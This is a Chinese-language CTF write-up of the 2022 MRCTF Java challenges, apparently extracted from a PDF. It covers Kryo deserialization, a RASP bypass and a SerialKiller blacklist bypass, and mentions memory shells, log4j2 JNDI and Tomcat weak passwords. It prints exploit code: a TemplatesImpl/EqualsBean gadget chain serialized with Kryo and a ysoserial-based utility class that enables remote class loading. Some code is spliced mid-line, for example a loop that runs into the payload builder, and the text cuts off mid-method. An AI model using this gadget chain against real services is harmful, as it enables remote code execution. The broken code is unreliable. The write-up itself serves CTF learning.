2022MRCTF-Java部分
2022MRCTF-Java部分
总结
Springcoffee -- Kryo反序列化、绕Rasp
思路分析
具体利⽤过程(Payload构造过程)
绕Rasp
EzJava -- Bypass Serialkiller
解读环境
Bypass
FactoryTransformer
Java_mem_shell_Filter
Java_mem_shell_Basic
总结
总的来说是⼀次⾮常不错的⽐赛，这⾥也会简单列出考点⽅便查阅学习，不难有点引导性质
Ps：此次⽐赛都是不出⽹，所以都需要内存马，内存马部分不做讲解很简单百度搜搜
下⾯这两题挺不错的也学到了东西，题⽬做了备份，核⼼代码(exp)也放到了git仓库备份，本
篇只是思路帖⼦
https://github.com/Y4tacker/CTFBackup/tree/main/2022/2022MRCTF
Springcoffee--Kryo反序列化、绕Rasp
EzJava--绕Serialkiller⿊名单中cc关键组件
下⾯这两题没啥参考价值，不过让我搞了下实战也还不错
Java_mem_shell_Filter--log4j2打jndi
Java_mem_shell_Basic---tomcat弱⼜令
Springcoffee -- Kryo反序列化、绕Rasp
ok，这东西也是从来没学过，又是从头开始，这⾥记录了当时是如何思考的分析思考过程
思路分析
⾸先看看整体⽬录结构
这⾥挑⼏个重要的来讲⼀下 CoffeeController
order路由反序列化
@RequestMapping({"/coffee/order"})
public Message order(@RequestBody CoffeeRequest coffee) {
  if (coffee.extraFlavor != null) {
    ByteArrayInputStream bas = new 
ByteArrayInputStream(Base64.getDecoder().decode(coffee.extraFlavor));
    Input input = new Input(bas);
    ExtraFlavor flavor = (ExtraFlavor)this.kryo.readClassAndObject(input);
    return new Message(200, flavor.getName());
demo路由，主要是根据输⼊修改⼀些关键配置，这个⽐较关键之后再说
@RequestMapping({"/coffee/demo"})
    public Message demoFlavor(@RequestBody String raw) throws Exception {
        System.out.println(raw);
        JSONObject serializeConfig = new JSONObject(raw);
        if (serializeConfig.has("polish") && 
serializeConfig.getBoolean("polish")) {
            this.kryo = new Kryo();
            Method[] var3 = this.kryo.getClass().getDeclaredMethods();
            int var4 = var3.length;
            for(int var5 = 0; var5  objectObjectHashMap = new HashMap<>();
        TemplatesImpl templates = new TemplatesImpl();
        byte[][] bytes = new byte[][]
{ClassPool.getDefault().get("demo.YYDS").toBytecode()};
        EqualsBean bean = new EqualsBean(String.class,"");
        setFieldValue(templates, "_bytecodes", bytes);
        setFieldValue(templates, "_name", "1");
        setFieldValue(templates, "_tfactory", new 
TransformerFactoryImpl());
        setFieldValue(bean,"beanClass", Templates.class);
        setFieldValue(bean,"obj",templates);
        Object gadgetChain = 
Utils.makeXStringToStringTrigger(templates,bean); // toString() trigger
        objectObjectHashMap.put(gadgetChain,"");
        kryo.writeClassAndObject(output, objectObjectHashMap);
以及Utils类
        output.flush();
        output.close();
        return new String(Base64.getEncoder().encode(bos.toByteArray()));
    }
    public void deser(String raw){
        ByteArrayInputStream bas = new 
ByteArrayInputStream(Base64.getDecoder().decode(raw));
        Input input = new Input(bas);
        ExtraFlavor flavor = 
(ExtraFlavor)this.kryo.readClassAndObject(input);
        System.out.println(flavor.getName());
    }
    public static void main(String[] args) throws Exception {
        Testt test = new Testt();
        String ser = test.ser("
{\"polish\":true,\"RegistrationRequired\":false,\"InstantiatorStrategy\": 
\"org.objenesis.strategy.StdInstantiatorStrategy\"}");
        test.deser(ser);
    }
}
package demo;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import 
com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import org.springframework.aop.target.HotSwappableTargetSource;
import sun.reflect.ReflectionFactory;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.Serializable;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;
import static 
com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRA
NSLET;
/*
 * Utility class - based on code found in ysoserial, includes method calls 
used in
 * ysoserial.payloads.util specifically the Reflections, Gadgets, and 
ClassFiles classes. These were
 * consolidated into a single util class for the sake of brevity; they are 
otherwise unchanged.
 *
 * Additionally, uses code based on 
marshalsec.gadgets.ToStringUtil.makeSpringAOPToStringTrigger
 * to create a toString trigger
 *
 * ysoserial by Chris Frohoff - https://github.com/frohoff/ysoserial
 * marshalsec by Moritz Bechler - https://github.com/mbechler/marshalsec
 */
public class Utils {
    static {
        // special case for using TemplatesImpl gadgets with a 
SecurityManager enabled
        System.setProperty(DESERIALIZE_TRANSLET, "true");
        // for RMI remote loading
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }
    public static final String ANN_INV_HANDLER_CLASS = 
"sun.reflect.annotation.AnnotationInvocationHandler";
    public static class StubTransletPayload extends AbstractTranslet 
implements Serializable {
        private static final long serialVersionUID = 
-5971610431559700674L;
        public void transform (DOM document, SerializationHandler[] 